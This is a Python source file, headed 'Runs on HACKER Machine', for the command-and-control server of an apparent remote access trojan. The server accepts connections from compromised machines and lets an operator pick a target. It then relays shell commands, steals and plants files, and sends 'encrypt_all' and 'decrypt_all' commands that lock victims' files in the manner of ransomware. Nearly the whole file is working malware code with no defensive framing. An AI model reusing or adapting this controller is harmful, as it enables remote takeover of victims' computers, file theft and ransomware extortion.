1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
# !/usr/bin/python

############################
## Runs on HACKER Machine ##
############################

import os
import sys
import time
import socket
import platform
import base64
from .config.ServerConfig import ServerConfig
from Crypto.Cipher import AES
from Crypto import Random


class MC(ServerConfig):
    socks = []
    clients = []

    # constructor
    def __init__(self):
        super(MC, self).__init__()
        self.init()

    # initializer
    def init(self):
        self.init_server_config()
        # set the a new socket
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # bind connections
        self.bind_and_listen()
        # connect
        self.start()

    # bind host & port
    def bind_and_listen(self):
        try:
            self._sock.bind((self._looper_host, self._port))
            self._sock.listen(self.MAX_CONNS)
        except socket.error as e:
            time.sleep(self.MID_INTERVAL)
            pass

    # We Start Here :)
    def start(self):
        while True:
            self.refresh()
            try:
                try:
                    self.wait(self.LONG_INTERVAL)
                    sock, addr = self.accept()
                except socket.timeout:
                    continue
                if sock:
                    sock.settimeout(self.NONE_TIMEOUT)
                    self.socks.append(sock)
                    self.clients.append(addr)
                self.refresh()
                time.sleep(self.INTERVAL)
            except KeyboardInterrupt:
                self.refresh()
                try:
                    self.choice = input("\nSELECT TARGET: ")
                    if self.choice == 0:
                        print("\nExiting...\n")
                        for n in range(0, len(self.socks)):
                            self.socks[n].close()
                        sys.exit()
                    elif isinstance(self.choice, str):
                        print("Invalid input")
                    self.choice -= 1
                    self.clean()
                    print("[!] Activating target {0}".format(self.clients[self.choice]))
                    self.FLAG = True
                    self.send_to(self.socks[self.choice], self.SIG)
                except IndexError:
                    print("Invaid Selection!")
                    time.sleep(self.INTERVAL)
            while self.FLAG:
                try:
                    data = self.receive_from(self.socks[self.choice])
                    data.lower()
                # disconnection from target side
                except:
                    self.client_disconnect(self.choice)
                    break
                self.data_handler(data)

    # refresh connections
    def refresh(self):
        self.clean()
        print('\nListening for clients...\n')
        if len(self.clients) > 0:
            for n in range(0, len(self.clients)):
                print("[{0}] Client: {1}\n".format((n + 1), self.clients[n]))
        else:
            print("...\n")
        # print(exit option
        print("---\n")
        print("[0] Exit \n")
        print("\nPress Ctrl+C to interact with client.")

    # timeout socket
    def wait(self, sec):
        self._sock.settimeout(sec)

    # accept connection
    # return -> socket object, ip address as string
    def accept(self):
        return self._sock.accept()

    # clean screen
    def clean(self):

        self._plat = platform.platform()
        if self._plat.startswith("lin") or self._plat.startswith("Lin"):
            lin = lambda: os.system("clear")
            return lin()
        elif self._plat.startswith("win") or self._plat.startswith("Win"):
            win = lambda: os.system("cls")
            return win()
        else:
            drw = lambda: os.system("clear")
            return drw()

    # receive data from socket
    def receive_from(self, csock):
        data = ""
        pkt = csock.recv(self.BUFFER)
        while pkt:
            data = data + pkt
            if data != "":
                break
            else:
                data = csock.recv(self.BUFFER)
        return data

    # force disconnect on specific client
    def client_disconnect(self, choice):
        print("\nClient disconnected... {0}".format(self.clients[choice]))
        self.close_remote(self.socks[choice])
        self.socks.remove(self.socks[choice])
        self.clients.remove(self.clients[choice])
        self.refresh()
        self.FLAG = False

    # handles the data
    def data_handler(self, data):
        # quit -> quit the remote host connection
        if 'quit' in data:
            self.close_remote(self.socks[self.choice])
            self.socks.remove(self.socks[self.choice])
            self.clients.remove(self.clients[self.choice])
            self.refresh()
            self.FLAG = False
        elif data != '':
            sys.stdout.write(data)
            next_command = raw_input()
        # download -> download a file from remote host
        if next_command.startswith("download "):
            if len(next_command.split(' ')) > 2:
                self.download(self.socks[self.choice], next_command.split(' ')[1], next_command.split(' ')[2])
            else:
                self.download(self.socks[self.choice], next_command.split(' ')[1])
        # upload -> upload a file to remote host
        elif next_command.startswith("upload "):
            if len(next_command.split(' ')) > 2:
                self.upload(self.socks[self.choice], next_command.split(' ')[1], next_command.split(' ')[2])
            else:
                self.upload(self.socks[self.choice], next_command.split(' ')[1])
        # get machine info
        elif next_command.startswith('sys_info'):
            self.send_to(self.socks[self.choice], next_command)
        # encrypt add data
        elif next_command.startswith('encrypt_all'):
            self.send_to(self.socks[self.choice], next_command)
        # encrypt single file
        elif next_command.startswith("encrypt "):
            if len(next_command.split(' ')) > 2:
                self.send_to(self.socks[self.choice], next_command.split(' ')[2])
        # decrypt all data
        elif next_command.startswith('decrypt_all'):
            self.send_to(self.socks[self.choice], next_command)
        # decrypt single file
        elif next_command.startswith("decrypt "):
            if len(next_command.split(' ')) > 2:
                self.send_to(self.socks[self.choice], next_command.split(' ')[2])
        # any other strings / commands
        elif next_command != '':
            self.send_to(self.socks[self.choice], next_command)

    # close and remove connections from socks & clients
    def close_remote(self, sock):
        sock.close()
        time.sleep(self.INTERVAL)

    # download file from remote host
    def download(self, sock, rf, lf=None):
        if not lf:
            lf = rf
        try:
            f = open(lf, 'wb')
        except IOError as e:
            print("Error opening file.\n{0}".format(e))
            self.send_to(sock, "cd .")
            return

        self.send_to(sock, "download " + rf)
        print("Downloading: {0} >  {1}".format(str(rf), str(lf)))
        time.sleep(self.INTERVAL)
        fd = self.receive_from(sock)
        print("> File size: {0}".format(str(len(fd))))
        time.sleep(self.INTERVAL)
        f.write(fd)
        time.sleep(self.INTERVAL)
        f.close()

    # upload file to remote host
    def upload(self, sock, lf, rf=None):
        # check if file exists
        if not rf:
            rf = lf
        try:
            g = open(lf, 'rb')
        except IOError:
            print("Error opening file.\n")
            self.send_to(sock, "cd .")
            return
        # start transfer
        self.send_to(sock, "upload " + rf)
        print("Uploading: {0} > {1}".format(str(lf), str(rf)))
        while True:
            fd = g.read()
            if not fd:
                break
            self.send_to(sock, fd)
            print("File size: {0}".format(str(len(fd))))
        g.close()
        time.sleep(self.INTERVAL)
        self.send_to(sock, "")
        time.sleep(self.INTERVAL)

    # sent data to socket
    @staticmethod
    def send_to(csock, sig):
        csock.sendall(str.encode(sig))


################################


def main():
    mc = MC()


if __name__ == '__main__':
    main()
